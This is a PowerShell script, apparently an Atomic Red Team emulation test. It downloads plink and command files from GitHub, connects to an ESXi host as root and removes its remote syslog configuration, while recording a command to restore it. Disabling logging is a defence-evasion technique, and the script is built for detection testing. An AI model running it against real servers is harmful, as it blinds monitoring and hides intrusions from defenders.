# ============================================
# ATOMIC RED TEAM - T1560.001 (ESXi Syslog Removal)
# Full script with automatic file download from GitHub
# ============================================

# --- НАСТРОЙКИ ---
$esxiHost = "atomic.local"
$esxiUser = "root"
$esxiPassword = "n/a"  # Замените на реальный пароль, если нужно

# --- СОЗДАЁМ ДИРЕКТОРИИ ---
Write-Host "[1/7] Creating directories..." -ForegroundColor Cyan
New-Item -Type Directory -Path "$env:TEMP\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
New-Item -Type Directory -Path "$env:TEMP\atomics\T1560.001\src\" -ErrorAction Ignore -Force | Out-Null
New-Item -Type Directory -Path "c:\temp" -ErrorAction Ignore -Force | Out-Null

# --- СКАЧИВАЕМ PLINK (ЕСЛИ ЕЩЁ НЕТ) ---
Write-Host "[2/7] Checking/downloading plink.exe..." -ForegroundColor Cyan
$plinkPath = "$env:TEMP\ExternalPayloads\plink.exe"
if (-not (Test-Path $plinkPath)) {
    try {
        Invoke-WebRequest -Uri "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile $plinkPath -ErrorAction Stop
        Write-Host "  -> plink.exe downloaded successfully" -ForegroundColor Green
    } catch {
        Write-Error "Failed to download plink.exe: $_"
        exit 1
    }
} else {
    Write-Host "  -> plink.exe already exists" -ForegroundColor Green
}

# --- ФУНКЦИЯ ДЛЯ СКАЧИВАНИЯ ФАЙЛОВ С GITHUB ---
function Download-GitHubFile {
    param(
        [string]$FileName,
        [string]$OutputPath
    )
    
    $rawUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1560.001/src/$FileName"
    
    Write-Host "  Downloading $FileName ..."
    try {
        Invoke-WebRequest -Uri $rawUrl -OutFile $OutputPath -ErrorAction Stop
        Write-Host "    -> Saved to $OutputPath" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "    -> Failed to download $FileName : $_" -ForegroundColor Red
        return $false
    }
}

# --- СПИСОК ФАЙЛОВ ДЛЯ СКАЧИВАНИЯ ---
Write-Host "[3/7] Downloading Atomic Red Team source files..." -ForegroundColor Cyan

$filesToDownload = @(
    @{ Name = "esxi_get_loghost.txt"; Description = "Command to get current syslog config" },
    @{ Name = "esxi_remove_loghost.txt"; Description = "Command to remove syslog config" }
    # Добавьте сюда другие файлы из папки src, если они нужны
    # Например:
    # @{ Name = "esxi_set_loghost.txt"; Description = "Command to set new syslog config" }
)

$allFilesDownloaded = $true
foreach ($file in $filesToDownload) {
    $outputPath = "$env:TEMP\atomics\T1560.001\src\$($file.Name)"
    $success = Download-GitHubFile -FileName $file.Name -OutputPath $outputPath
    if (-not $success) {
        $allFilesDownloaded = $false
    }
}

if (-not $allFilesDownloaded) {
    Write-Warning "Some files failed to download. The script may not work correctly."
}

# --- ПРОВЕРЯЕМ НАЛИЧИЕ НЕОБХОДИМЫХ ФАЙЛОВ ---
$getLoghostFile = "$env:TEMP\atomics\T1560.001\src\esxi_get_loghost.txt"
$removeLoghostFile = "$env:TEMP\atomics\T1560.001\src\esxi_remove_loghost.txt"

if (-not (Test-Path $getLoghostFile)) {
    Write-Error "Required file not found: $getLoghostFile"
    exit 1
}
if (-not (Test-Path $removeLoghostFile)) {
    Write-Error "Required file not found: $removeLoghostFile"
    exit 1
}

# --- ПОЛУЧАЕМ ТЕКУЩИЙ LOGHOST ---
Write-Host "[4/7] Getting current syslog configuration from ESXi..." -ForegroundColor Cyan
$loghostFile = "c:\temp\loghost.txt"

try {
    $plinkOutput = & $plinkPath -ssh $esxiHost -l $esxiUser -pw $esxiPassword -m $getLoghostFile 2>&1
    $plinkOutput | Select-String -Pattern "\d+\.\d+\.\d+\.\d+" | Out-File -FilePath $loghostFile -Encoding ascii
    
    Write-Host "  -> Raw output from ESXi:" -ForegroundColor Gray
    $plinkOutput | ForEach-Object { Write-Host "     $_" -ForegroundColor Gray }
} catch {
    Write-Error "Failed to execute plink: $_"
    exit 1
}

# --- УДАЛЯЕМ СТАРЫЙ IP (ЕСЛИ ОН ЕСТЬ) ---
Write-Host "[5/7] Checking if IP address needs to be removed..." -ForegroundColor Cyan

if ((Get-Content $loghostFile -ErrorAction SilentlyContinue).Count -gt 0) {
    Write-Host "  -> Found IP configuration, removing it..." -ForegroundColor Yellow
    try {
        & $plinkPath -ssh $esxiHost -l $esxiUser -pw $esxiPassword -m $removeLoghostFile
        Write-Host "  -> IP address removed from syslog configuration" -ForegroundColor Green
    } catch {
        Write-Error "Failed to remove IP address: $_"
    }
} else {
    Write-Host "  -> No IP found in current configuration. Nothing to remove." -ForegroundColor Green
}

# --- ИЗВЛЕКАЕМ IP ДЛЯ ОТЧЁТА ---
Write-Host "[6/7] Extracting IP address for reporting..." -ForegroundColor Cyan
$outputFilePath = "c:\temp\loghost_ip.txt"

if (Test-Path $loghostFile) {
    $fileContent = Get-Content -Path $loghostFile -Raw
    
    if ([string]::IsNullOrWhiteSpace($fileContent)) {
        Write-Host "  -> The file is empty. No IP address to report." -ForegroundColor Yellow
    } else {
        # Ищем IP с протоколом (udp:// или tcp://)
        $ipMatches = [regex]::Matches($fileContent, '(udp|tcp)://(\d{1,3}\.){3}\d{1,3}')
        
        if ($ipMatches.Count -gt 0) {
            $ipAddresses = $ipMatches[0].Value
            $output = "esxcli system syslog config set --loghost=" + $ipAddresses
            $output | Out-File -FilePath $outputFilePath -Encoding ascii
            Write-Host "  -> IP address extracted: $ipAddresses" -ForegroundColor Green
            Write-Host "  -> Report saved to: $outputFilePath" -ForegroundColor Green
            Write-Host "  -> Command to restore: $output" -ForegroundColor Yellow
        } else {
            Write-Host "  -> No valid IP with protocol found in the file" -ForegroundColor Yellow
            Write-Host "  -> File content: $fileContent" -ForegroundColor Gray
        }
    }
} else {
    Write-Host "  -> Loghost file not found: $loghostFile" -ForegroundColor Yellow
}

# --- ИТОГ ---
Write-Host "[7/7] Script completed!" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "Files used/locations:" -ForegroundColor White
Write-Host "  - plink.exe: $plinkPath"
Write-Host "  - get command: $getLoghostFile"
Write-Host "  - remove command: $removeLoghostFile"
Write-Host "  - log output: $loghostFile"
Write-Host "  - IP report: $outputFilePath"